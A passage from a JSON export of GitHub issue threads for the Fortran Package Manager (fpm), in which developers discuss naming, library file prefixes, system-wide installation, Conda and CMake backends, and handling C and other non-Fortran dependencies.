                    "user": "LKedward",
                    "date": "2020-12-29 12:09:14+00:00",
                    "text": "+1 for a Fortran-based preprocessor, however as pointed out by Ivan, there is notoriously poor portability due to variation among Fortran preprocessor implementations. This is the primary reason for me avoiding preprocessors with Fortran. With that said I am quite impressed by what can be achieved with fypp.\nI wonder whether there is interest in developing a community-agreed standard for preprocessing Fortran. Failure of previous standardisation efforts shouldn't preclude this."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-29 14:02:43+00:00",
                    "text": "I am also quite satisfied by what can be done with fypp (even if the syntax is quite verbose). However, I am not sure if Ondrej's suggestion to have a Fortran / C++ version of fypp is feasible. At least some elements of the fypp preprocessor language are tightly coupled to Python, e.g. one can call Python functions directly.\nCertainly, fpm is an excellent place to experiment with new preprocessing constructs. As long as the intermediate (standard-conforming) \".f90\" files are recoverable one can use it portably across compilers. On a personal level however, I will rather direct my efforts in other areas first."
                }
            ]
        },
        {
            "number": 77,
            "user": "milancurcic",
            "date": "2020-05-10 18:20:20+00:00",
            "title": "Should we refer to this software as FPM or fpm?",
            "text": "They mean the same, but they look and \"feel\" different. We should have a consistent way to refer to this so it's not confusing to the readers whether they're different things. Especially as we begin to write about these things more publicly?\nI've been using both. I don't know which one I prefer. Perhaps 60/40 in favor of fpm.\nSo, which one should it be?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-10 18:24:29+00:00",
                    "text": "I've been using both also. Let's use lowercase.\n\nI think fpm, with `fpm` in markdown. Just like git or markdown.\n\nIf it is at the beginning of a sentence, let's use Fpm.\n\u2026\nOn Sun, May 10, 2020, at 12:20 PM, Milan Curcic wrote:\n\n\n They mean the same, but they look and \"feel\" different. We should have\n a consistent way to refer to this so it's not confusing to the readers\n whether they're different things. Especially as we begin to write about\n these things more publicly?\n\n I've been using both. I don't know which one I prefer. Perhaps 60/40 in\n favor of fpm.\n\n So, which one should it be?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#77>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDU4C2JEGTK7CN6IJTRQ3V7BANCNFSM4M5LDRPA>."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 18:31:19+00:00",
                    "text": "I guess git uses both Git and git: https://git-scm.com/\n\nI think svn also uses both SVN and svn.\n\nI am fine either way.\n\nWe can have a rule to use FPM when referencing the project, but fpm when the executable, and encourage to use fpm where it make sense. But should we write Fortran Package Manager (FPM) or Fortran Package Manager (fpm) at the top of the website?\n\nOndrej\n\u2026\nOn Sun, May 10, 2020, at 12:24 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I've been using both also. Let's use lowercase.\n\n I think fpm, with `fpm` in markdown. Just like git or markdown.\n\n If it is at the beginning of a sentence, let's use Fpm.\n\n On Sun, May 10, 2020, at 12:20 PM, Milan Curcic wrote:\n >\n >\n > They mean the same, but they look and \"feel\" different. We should have\n > a consistent way to refer to this so it's not confusing to the readers\n > whether they're different things. Especially as we begin to write about\n > these things more publicly?\n >\n > I've been using both. I don't know which one I prefer. Perhaps 60/40 in\n > favor of fpm.\n >\n > So, which one should it be?\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#77>, or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWDU4C2JEGTK7CN6IJTRQ3V7BANCNFSM4M5LDRPA>.\n >"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-10 18:59:39+00:00",
                    "text": "Node Package Manager uses npm universally. Even the company is called \"npm, Inc.\".\nI vote for fpm all the way, and fpm when referring specifically to the command line executable."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 19:14:26+00:00",
                    "text": "I also vote fpm all the way.\n\u2026\nOn Sun, May 10, 2020, at 12:59 PM, Milan Curcic wrote:\n\n\n Node Package Manager <https://www.npmjs.com/> uses npm universally.\n Even the company is called \"npm, Inc.\".\n\n I vote for fpm all the way, and `fpm` when referring specifically to\n the command line executable.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#77 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH4JET6LJBKTX7JHJLRQ32SNANCNFSM4M5LDRPA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 02:19:29+00:00",
                    "text": "I can come up with logical arguments for either.\nOn the one hand, it's a proper noun, Fortran is capitalized, and it's an acronym, so FPM would make sense.\nOn the other hand, Fortran is a case insensitive language, and our community style guide seems to be leaning towards all lowercase, so fpm would be consistent with that.\nGiven that this really is a purely aesthetic choice, and there seems to be a trend in other places towards all lowercase, I have nothing against using fpm everywhere. I'll start doing that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-17 20:09:08+00:00",
                    "text": "The consensus so far is to use \"fpm\" everywhere. Closing."
                }
            ]
        },
        {
            "number": 76,
            "user": "everythingfunctional",
            "date": "2020-05-10 04:15:33+00:00",
            "title": "Prefix library archive file names with lib",
            "text": "Fix #75",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-10 05:01:32+00:00",
                    "text": "+1, looks good\n\u2026\nOn Sat, May 9, 2020, at 10:15 PM, Brad Richardson wrote:\n\n\n @everythingfunctional <https://github.com/everythingfunctional>\n requested your review on: #76\n <#76> Prefix library archive\n file names with lib.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#76 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWC2J6GTOZI5TTUQDW3RQYS7BANCNFSM4M5CPJ6A>."
                }
            ]
        },
        {
            "number": 75,
            "user": "milancurcic",
            "date": "2020-05-09 20:22:10+00:00",
            "title": "Add lib prefix to the static library file name",
            "text": "Currently, FPM emits a static library file that has the same name as the project. For example, first line of fpm.toml could be:\nname = \"datetime\"\nThen, the static library created is datetime.a. However, the canonical way to name libraries (static and dynamic) is to use a lib prefix: libdatetime.a. Then one can link to this library with -ldatetime.\nCurrent workaround can be to add the lib prefix to the package name in fpm.toml:\nname = \"libdatetime\"\nHowever, this isn't pretty, and would down the road be more awkward once we're installing packages from remote URLs.\nLet's add the lib prefix to library files.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-09 21:25:13+00:00",
                    "text": "I agree.\n\u2026\nOn Sat, May 9, 2020, at 2:22 PM, Milan Curcic wrote:\n\n\n Currently, FPM emits a static library file that has the same name as\n the project. For example, first line of `fpm.toml` could be:\n\n name = \"datetime\"\n Then, the static library created is `datetime.a`. However, the\n canonical way to name libraries (static and dynamic) is to use a `lib`\n prefix: `libdatetime.a`. Then one can link to this library with\n `-ldatetime`.\n\n Current workaround can be to add the `lib` prefix to the package name\n in `fpm.toml`:\n\n name = \"libdatetime\"\n However, this isn't pretty, and would down the road be more awkward\n once we're installing packages from remote URLs.\n\n Let's add the `lib` prefix to library files.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#75>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWETEZUJY7Q5QWRYIYTRQW3P3ANCNFSM4M46DEDQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-10 03:41:20+00:00",
                    "text": "I see. This is a simple enough change to make. I will note however that FPM is just including the archive directly in the link command, rather specify both -Ilib/folder and -lname arguments. So this will only impact users doing things outside of FPM. Granted that many people will want to do things outside of FPM, I think it makes sense to go ahead and do it."
                }
            ]
        },
        {
            "number": 74,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:55:33+00:00",
            "title": "Add compiler to build path",
            "text": "This is the first part of supporting #66\nNote: This should be merged after #72",
            "comments": []
        },
        {
            "number": 73,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:35:09+00:00",
            "title": "Output a message if no executables or tests are found",
            "text": "Fix #64",
            "comments": []
        },
        {
            "number": 72,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:22:15+00:00",
            "title": "Remove compiler option from `fpm.toml`",
            "text": "Fix #63",
            "comments": []
        },
        {
            "number": 71,
            "user": "epagone",
            "date": "2020-05-03 17:20:05+00:00",
            "title": "Install app or library system-wide",
            "text": "I know it might be a bit early but I'd like to log this issue that is particularly important for me.\nTo use routinely fpm, I would need a functionality that works a bit like sudo make install to install the executable or library system-wide.\nPS: thanks for your great work!",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-03 21:16:09+00:00",
                    "text": "@epagone thanks! Yes, we have to do it.\n@everythingfunctional how can one do that using stack install? I read through stack install --help but didn't see an option to install into /usr/local/bin/."
                },
                {
                    "user": "epagone",
                    "date": "2020-05-03 22:58:47+00:00",
                    "text": "I read through stack install --help but didn't see an option to install into /usr/local/bin/.\n\nFor the records, on Ubuntu 20.04, if I copy manually my library files (libsomething.a) in /usr/local/lib/ or /usr/lib, gfortran finds it with $ gfortran libtest.f90 -lsomething.\nHowever, copying the module files to /usr/local/include does not work and the full path must be specified after the -I flag: $ gfortran libtest.f90 -lsomething -I/usr/local/include\nPS: sorry for having repeatedly edited my message, but I have been experimenting a bit and I didn't want to leave confusing or contradictory messages around."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-04 02:16:33+00:00",
                    "text": "I think having an install functionality is definitely desired. I believe with stack, stack install is just for executables. I'd lean towards doing the same thing with FPM. I can easily see the desire to install an executable, but I'm not sure I fully understand the benefits of having FPM install libraries.\nFor installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things. Also, FPM is compiling archives, not shared object libraries. And if you're using FPM, you don't need to have the library installed on your system in order for other packages to use it. That's whole point of FPM.\nI'm not completely opposed to the idea, but I would need somebody to show me a use case that would constitute good practice. I'd rather FPM not try and also take on the role of system package manager. I think twice about anything that needs sudo to do it."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 04:38:39+00:00",
                    "text": "Ah, I missed this point: this is about fpm installing the apps and libraries systemwide.\nWhy don't we start with what Cargo does via cargo install --root ... which however is for Cargo managed packages, and then we see what else we can do. I think installing apps that are statically linked should be no problem.\nFinally, that's a good point that if fpm is to become a usable replacement for CMake (let's say), it must be able to install the executables and libraries to a user defined location.\n(Most probably we'll have to be able to build both static and dynamic libraries with fpm down the road.)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-04 07:47:24+00:00",
                    "text": "For installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things.\n\nThe Linux file system has a well-defined segregation between files installed by package managers and those built by users; as @epagone mentioned user-built executables/libraries/headers go in /usr/local/bin /usr/local/lib (both shared and static) and /usr/local/include. This is a common target for makefiles for c libraries and avoids the need to specify include and library paths when compiling and linking.\nHowever this approach can't be used for Fortran libraries because:\n\n\nUnlike c, Fortran has no application binary interface which means that compiled libraries are specific to the compiler and compiler version that compiled it.\n\n\nThere is no agreed-upon location to place (and search for) the requisite .mod files, which are also binary-specific to the compiler and compiler version that generated them.\n\n\nI agree with @everythingfunctional that one of the goals of fpm is to solve this problem for us; specifically, it handles module paths and linker library paths for us in a robust and repeatable manner (which is the main advantage of installing system-wide IMO).\nI think install functionality for executables is a natural functionality, I would like:\n\n(sudo) fpm install for /usr/local/bin and;\nfpm install --local for $HOME/.local/bin"
                },
                {
                    "user": "epagone",
                    "date": "2020-05-04 10:10:17+00:00",
                    "text": "@everythingfunctional\n\nI think having an install functionality is definitely desired. I believe with stack, stack install is just for executables. I'd lean towards doing the same thing with FPM. I can easily see the desire to install an executable, but I'm not sure I fully understand the benefits of having FPM install libraries.\nFor installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things. Also, FPM is compiling archives, not shared object libraries. And if you're using FPM, you don't need to have the library installed on your system in order for other packages to use it. That's whole point of FPM.\n\nSorry, but I do not understand. Let's take this example: I have a string manipulation library that I build from source pulling a GitHub repo. I need this library in almost all of my many projects. I think it's obvious to expect from the package manager the ability to make the library available system-wide. (FWIW, I am not using FoBiS exactly because it lacks this functionality.) Am I doing something wrong in my development procedures?\n@LKedward\n\nHowever this approach can't be used for Fortran libraries because:\n1. Unlike c, Fortran has no application binary interface which means that compiled libraries are specific to the compiler and compiler version that compiled it.\n\n2. There is no agreed-upon location to place (and search for) the requisite `.mod` files, which are also binary-specific to the compiler and compiler version that generated them.\n\n\nOuch. Thanks for this explanation, but it's really a bad news! \ud83d\ude1e"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-04 14:29:36+00:00",
                    "text": "I need this library in almost all of my many projects.\n\nIf you're using FPM, then it has the responsibility to provide the appropriate version to compile and link with your project. It does not rely on whatever version happens to be installed on your system.\nSay for example, the latest version of a library introduced a breaking change that your project relies on. You can continue using the old version for your old project, but use the latest version in your new project, on the same machine, and not have any issues."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 15:22:18+00:00",
                    "text": "@epagone wrote:\n\nI think it's obvious to expect from the package manager the ability to make the library available system-wide.\n\nYes, that's the goal. Fpm must have an option to install a library systemwide or to any location you want."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-04 15:35:54+00:00",
                    "text": "I also think it's important to allow both static and dynamic library builds down the road.\nIf I understand this correctly, it seems to me that the high-level debate here is whether fpm should work only within the context of a local, package-specific environment (@everythingfunctional position I think), vs. whether fpm could also install to places elsewhere on the system (regardless whether it's a root or user directory).\nIf you always worked in the package-specific environment, that means that you'd need to rebuild the same dependency for every project that uses it, rather than re-use an existing build. I don't know if Cargo for example can build system-wide, but its canonical behavior is to rebuild everything per-project. For example if you try a demo database or web-server project in Rust, you'll first be building all the 500 dependencies that it needs.\nBesides the rationale others already provided, another advantage to this is that some libraries take some time to build (for example NetCDF). Rebuilding them for every new project would hurt user experience.\nI think both approaches should be possible. Default should be like Cargo. How about this UI:\n\nFor in-package build, fpm build suffices, no need for fpm install. The library is already installed in build/... in the package directory.\nFor install elsewhere, fpm install installs to a sane default user location, perhaps /home/user/.fpm/{bin,lib,include}.\nFor install to a specific place, fpm install --prefix=/path/to/install."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 15:48:08+00:00",
                    "text": "I agree with @milancurcic's proposal at the end.\nLet's start with rebuilding everything for each directory where you call fpm build. But down the road fpm can simply build somewhere in ~/.fpm/ and cache each build and reuse them where possible.  Note also that this build directory (whether local to a project directory or in ~/.fpm/) I think might be a bit different from the fpm install command --- the build directory might have more information / metadata that the install command doesn't need to install.\nAnyway, I think we can design this so that each of us will get the functionality that we want."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-04 15:54:37+00:00",
                    "text": "If we do eventually place built libraries in a central location like ~/.fpm/ then I would suggest that this path include the compiler and compiler version for the same reasoning as #66 due to binary incompatibility between compilers. e.g. ~/.fpm/gfortran-9.1.0/bin etc."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 17:55:03+00:00",
                    "text": "@LKedward yes, that's necessary. In fact it should be done by hashes, where a hash depends on:\n\ncompiler vendor and version\nwhether Debug or Release build\nhash of the sources for the package\nall dependencies' hashes\nhow the given package was configured --- Cargo allows some optional capabilities and we might too in the future, say if you want to build a package with or without netcdf support\n..."
                }
            ]
        },
        {
            "number": 70,
            "user": "certik",
            "date": "2020-04-30 20:08:12+00:00",
            "title": "Have a Conda backend",
            "text": "This is related to #69 but it's a separate issue. fpm should be able to create a Conda package for the project, so that it's easy to submit it to conda-forge.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:27:15+00:00",
                    "text": "What's required for a Conda package?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 21:44:39+00:00",
                    "text": "Here is a Conda package for my dftatom Fortran package:\nhttps://github.com/conda-forge/dftatom-feedstock/\nThe main config file:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/meta.yaml\nLinux / macOS build script:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/build.sh\nAnd Windows build script:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/bld.bat\nAll of which could be generated. The build process could simply just call fpm on all platforms."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 22:50:54+00:00",
                    "text": "That seems like it wouldn't actually require any changes to FPM."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 23:27:16+00:00",
                    "text": "One still has to generate things like \"description\", \"name\" (both of which fpm knows), and the proper template to call fpm. But yes, it should be a simple backend to fpm."
                }
            ]
        },
        {
            "number": 69,
            "user": "certik",
            "date": "2020-04-30 20:07:05+00:00",
            "title": "Have CMake and Make backends",
            "text": "Currently the Haskell based fpm is compiling things directly, just like Cargo does it. That's the best default. (The \"archived\" Rust based fpm was generating CMake.)\nHowever, until fpm is everywhere used by everybody, it would be super helpful to have a CMake and pure Make backends. That way we can move packages like stdlib or any of my own packages into using fpm, and yet not require it from the users --- they would continue using CMake or Make.\nAlso by generating the CMake / Make automatically, it will be a lot easier to maintain those in stdlib for example.\nSince fpm knows (or should know) everything about the Fortran project, it can generate 100% robust CMake and Make files, following the latest practices for CMake / Make, human readable, etc.\nI am thinking having these backends would be beneficial for many purposes, such as debugging, anyway. We should also have a Ninja backend.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:18:49+00:00",
                    "text": "and yet not require it from the users --- they would continue using CMake or Make.\nAlso by generating the CMake / Make automatically, it will be a lot easier to maintain those in stdlib for example.\n\nI don't understand why generate CMake of Make files. If fpm is smart enough to generate a correct CMake or Makefile for an arbitrary package, would it not be smart enough to simply build the package on its own?\nI thought that the value of enabling CMake or Make backend is when fpm is not smart enough yet to build the package on its own, but is just smart enough to detect an existing CMakeLists.txt, Makefile, or configure file, and run the appropriate commands to build it, like, cmake . or FC=gfortran make."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 20:31:08+00:00",
                    "text": "Let me see if I can explain it better.\nWe should assume that fpm is smart enough to completely build the project on its own. We are very close and we will get there soon.\nThe other assumption is that the goal has never been to call an existing CMakeLists.txt or configure script. The whole point of fpm is that users write fpm.toml and they never write CMakeLists.txt or configure by hand.\nSo with these assumptions, yes, you can just use fpm. However, it will be a while before we can just get every user using fpm. For example I don't think it would be wise to get rid of the CMake build system in stdlib and only use fpm --- maybe later, but not today. At the same time, I would love to be using fpm with stdlib as well as all my other Fortran projects now.  So to achieve it, if fpm can generate CMake, then users of my packages can keep using CMake as they do now. But I, as a developer, can just use fpm, and use fpm to generate the CMake files for my users (and commit them to git), so that I do not need to maintain the fpm build system, and a separate CMake build system by hand. And since fpm knows how to build the project on its own, it also by definition knows how to generate beautiful looking CMake files that just work (or any other build system also)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:48:36+00:00",
                    "text": "Okay, I understand now. The use case for this is when a developer releases a new package, they can use fpm to emit configuration files for different build systems.\nFor example, datetime-fortran started with a manual Makefile. Then Zaak wrote a CMakeLists.txt, and Michael modernized it later. Mark wrote an autotools config. Now it can be built in these different ways.\nIf I had fpm back then, I could just have done something like:\nfpm build --cmake\nfpm build --make\nfpm build --conda\n...\n\nand be done with it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 20:55:48+00:00",
                    "text": "Yes exactly. And not just be done with it, but you can keep using fpm to keep the other build systems up-to-date. When you have a bigger project, the inter-dependencies of Fortran modules change every time you modify the use line (all the time). So you have to update manual Makefiles all the time you change this. And every time you add / remove files or move them around, you would have to update CMake also. fpm could do all that for you.\nIn fact fpm could detect that your project contains fpm-generated CMake (from some comment in it) and it can warn you every time it needs to be re-generated."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:25:36+00:00",
                    "text": "So, the idea here is that, not only should FPM be able to use \"non\"-FPM packages, it should also be able to generate \"non\"-FPM packages? I think this may be inviting a lot of requests for special cases. We might end up constantly chasing users who aren't willing to actually use FPM as intended.\nI'm not saying it isn't doable or worth considering. If we limit the scope to saying these other build systems must functionally produce exactly what FPM itself would do it might not be too bad, but then I don't think that actually reaches many people that we wouldn't have already convinced to switch over.\nOn the other hand it might provide a slightly smoother transition path. Make these tweaks to your current build system so FPM can use. Then get all your user's to adjust to that. Then stop maintaining that build system yourself and let FPM do it.\nI'll have to think about this for a while."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 21:37:02+00:00",
                    "text": "I made a joke a year ago, and we may actually do it.\nI share the same concerns as Brad. Mainly that this effort may not be closely aligned with FPM itself. In other words, it would be helping users to not use FPM. On the other side, if this would help many packages support multiple build systems, it would improve their portability, a long-term Fortran goal."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 21:51:19+00:00",
                    "text": "From a practical perspective, we already use both CMake and manual Makefiles for stdlib (because people have requested both) and now we also want to use fpm. I have the same problem with dftatom and Milan with datetime-fortran. I bet there are tons of other projects like that too. So instead of each of us maintaining 3 different build systems, let's just all collaborate on CMake and Makefile backend to fpm, which will produce higher quality CMake / Makefile in the end, and it will remove the burden of each of us maintaining 3 different build systems."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 22:53:34+00:00",
                    "text": "Ok, let's at least finish a beta version that just supports standard FPM projects before we start tackling this one though."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 23:27:47+00:00",
                    "text": "I agree. I only posted it here to keep it in mind."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-07 18:00:39+00:00",
                    "text": "Okay, I understand now. The use case for this is when a developer releases a new package, they can use fpm to emit configuration files for different build systems.\nFor example, datetime-fortran started with a manual Makefile. Then Zaak wrote a CMakeLists.txt, and Michael modernized it later. Mark wrote an autotools config. Now it can be built in these different ways.\nIf I had fpm back then, I could just have done something like:\nfpm build --cmake\nfpm build --make\nfpm build --conda\n...\n\nand be done with it.\n\nI think this feature will be great in particular when you want to distribute a code:\n\nsome users just want to type \"make\" to be able to compile the code (and maybe edit the makefile)\nthe fpm installation (with its dependencies) is not straightforward and it adds another layer. If it fails, without this feature you will not be able to run the code.\n\nlauvergn (alias gardhor)"
                },
                {
                    "user": "certik",
                    "date": "2020-12-09 19:32:57+00:00",
                    "text": "What would be a good behavior for the end user for the cmake backend?\nPerhaps\nfpm generate --cmake\n\nand it would create (or override) proper CMakeLists.txt files for your current project in your existing directory. Then I can commit them to git if I want to. (There can be another mode where it copies everything into a new directory.)\nWhat about dependencies? One way could be to create proper CMakeLists.txt in build/dependencies, and then hook them up properly from your main project CMakeLists.txt.\n@LKedward, @milancurcic what do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 19:41:59+00:00",
                    "text": "@certik I currently working on a meson backend for fpm built upon #266 and #257, once either of the PRs is merged I can get this branch from its currently transitional state into a stable form and publish it for testing.\nI have a (somewhat) working model for CMake as well, but this is far more involved to get a proper dependencies handling compared to meson, therefore I won't push any of those until I'm done with meson generator."
                }
            ]
        },
        {
            "number": 68,
            "user": "certik",
            "date": "2020-04-30 19:50:53+00:00",
            "title": "How to handle non-Fortran dependencies",
            "text": "I am very confident we can make fpm very robust to work for pure Fortran packages. Just like Cargo works well for pure Rust packages or pip works great for pure Python packages.\nThe problem is with non-Fortran packages. Pip allows to hook in compiling C (and with some work) Fortran code, but it's very fragile in my experience (thus the motivation for Conda that is a binary package manager). Python doesn't have an option to avoid C++/Fortran dependencies because Python itself is slow. Rust allows to (in principle) rewrite everything in Rust. As an example, take png. The system bindings: https://crates.io/crates/libpng-sys they say are unreliable, and you should use a pure Rust implementation: https://lib.rs/crates/lodepng.\nI agree it does make things more robust to stick to pure Fortran and for many things we will do that and people will provide pure Fortran implementation of basic tasks. Python cannot do it well due to performance, but Rust and Fortran can.\nHowever, we still need a robust way of handling non-Fortran dependencies, because if there is a robust and well maintained library in another language, we should just use it instead of reimplementing everything. Take HDF5. Here is the Rust package: https://crates.io/crates/hdf5. If you look at the documentation how to build it: https://github.com/aldanor/hdf5-rust they even mention Conda (to install the HDF5 library itself on all platforms --- which in my experience is much more robust than pip). Anyway, the way it works is by this line: https://github.com/aldanor/hdf5-rust/blob/15ec644977e0bee2b77340272730b34209c3765b/Cargo.toml#L11 which causes Cargo to execute this script: https://github.com/aldanor/hdf5-rust/blob/15ec644977e0bee2b77340272730b34209c3765b/build.rs which emits flags how to link against HDF5 correctly. That way the Cargo itself doesn't need to know almost anything, it just parses the output of this file. I think we should follow the same approach in fpm. The flags in this case are emitted by: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/src/lib.rs#L65. I think this is when you link against hdf5 rust package in your own code. How to link against hdf5 library itself is done here I think: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/build.rs#L566, it's quite complicated unfortunately.\nBut it's clean from the Cargo side, it offloads the responsibility to the package itself. We can provide helpers that fpm packages can use to work with things like pkg-config, cmake packages, etc.\nIn Rust it looks like each package is on their own, so for example this HDF5 package has messy code for each platform, e.g., here: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/build.rs#L492, you can see they are checking brew, or Windows registry, etc.\nThe good news is that Fortran codes do not need many non-Fortran dependencies, and so doing what Rust does might work for us. What I've seen is that Fortran codes mostly need some of: Lapack, MPI, FFT, MKL, HDF5, JSON, NETCDF, HYPRE, ...\nOf which MPI and Lapack being the most important. I think fpm will have support for all Fortran compilers and I think it can have built-in support for MPI and Lapack also. One reason to special case MPI and Lapack is so that one can switch MPI implementaitons and Lapack implementations easily, and not have the Fortran packages hardcoded with a particular implementation.\nWith those out of the way, the rest can be done Cargo style, at least for now. Most other packages have just one implementation, so Fortran packages can just depend on a particular package (say Arpack, or Scalapack).",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:03:57+00:00",
                    "text": "I agree, this sounds quite reasonable as a first stab. Thank you for the research.\nMy personal sorted list of most used non-Fortran dependencies: MPI, HDF5, NetCDF, zlib, libpng.\nIf everybody here listed their most used dependencies, we could have an idea of top candidates which to design for and test first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:06:38+00:00",
                    "text": "I definitely would like to be able to handle some non-Fortran dependencies. As it's currently designed, I think it won't be that difficult.\nThe end result of building a library in FPM is just a .a file, and all of the relevant .mod files. So, if your package specifies a build script for that, FPM will just call it. There is a small set of things that FPM would like to dictate to that script though. Those being:\n\nThe compiler to use\nThe compiler flags to use (mostly to ensure the flags are compatible with the given compiler)\nWhere to put the archive and module files\nWhere to find any of the dependencies\n\nIn this way, almost anything could be wrapped into an FPM package. Best practice would be to entirely wrap the package into a Fortran API, so consumers don't necessarily even have to know it's not Fortran, but this may not be strictly necessary in every case.\nFor the build scripts, I really like Rust's way of having the build scripts be written in Rust too. Not sure if Fortran would really be doable for that, but it would make sure building a package doesn't have additional external requirements. We could special case Makefiles and CMakeLists to use the typical environment variables I think."
                },
                {
                    "user": "pdebuyl",
                    "date": "2020-05-13 12:53:00+00:00",
                    "text": "C has a special relationship to Fortran though. Thanks to the compatibility section, it makes sense for a Fortran developer to include C code in a Fortan project. Could that be taken into account?\nMy \"pet\" usage for this is to write a PRNG in C with a Fortran wrapper module. PRNGs often use unsigned integers whose usage is possible in C.\nA fpm package could thus, in this scenario, contain Fortran and C source."
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 14:18:22+00:00",
                    "text": "@everythingfunctional, @milancurcic and I discussed this point on the phone and we think so far that the best way forward is to work with Conda (or Mamba to be specific) together with their developers (@wolfv and others) to provide all non-Fortran dependencies. fpm would link with mamba and from a user perspective things would just work (users would not need to handle Conda environments explicitly).\nRegarding C support, I would suggest initially to handle them via Conda, just to keep things simple.\nWe can think if if want to later extend fpm to handle not only Fortran compilers but also C and C++ compilers."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-13 14:34:13+00:00",
                    "text": "@pdebuyl , my recommendation would be to put the C parts of your project in a separate project so that fpm can easily build the \"pure Fortran\" part of your project with ease.\nWe're planning to support make and Cmake as separate build scripts, so supporting linking with (almost) any other language and still having it be an fpm package would be possible."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-13 16:20:01+00:00",
                    "text": "@everythingfunctional , @certik , what are the disadvantages/difficulties with natively supporting c sources in fpm? Many projects do need to include c code from time to time and this is quite normal for Fortran (even before iso_c_binding came along). I think this would be a good feature.\n(I'm not talking about whole package dependencies, just self-contained projects with mixed c/Fortran code)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-13 16:26:15+00:00",
                    "text": "I don't foresee issues with building C alongside Fortran. It may be even simpler as there are no modules to deal with."
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 16:35:13+00:00",
                    "text": "Regarding C support: a full solution there is this: mamba-org/mamba#223.\nWhat we could do for fpm is not the full solution, but provide functionality for simple C source files, not full packages with a complicated build system.\nWe have to decide on a layout for C sources:\n\n\nShould the .c files be simply files in src/ folder? (I vote yes.)\n\n\nWhere should the header files be? Either in src/ or in include/.\n\n\nWhat about dependencies and their header files? (I would suggest Conda and that you can use anything from there, so fpm will create an internal environment and you can use any header file from there.)\n\n\nWhat about linking of dependencies?\n\n\nGiven that we will support C, why not C++ also? Supporting C++ would be very useful to provide Fortran wrappers: we would write a simple C wrapper that calls into a 3rd party C++ library, and call that C wrapper from Fortran, so it requires compiling of a C++ code.\n\n\nAlso one needs to link libc properly for C, and libc++ properly for C++. I think we have to do this anyway anytime we depend on a C or C++ library.\n\n\nThere will be more issues. Some of them similar to what we have to deal with anyway for Fortran sources. So I think let's keep this option open when we are designing fpm, although I still suggest to concentrate on Fortran sources first."
                },
                {
                    "user": "milancurcic",
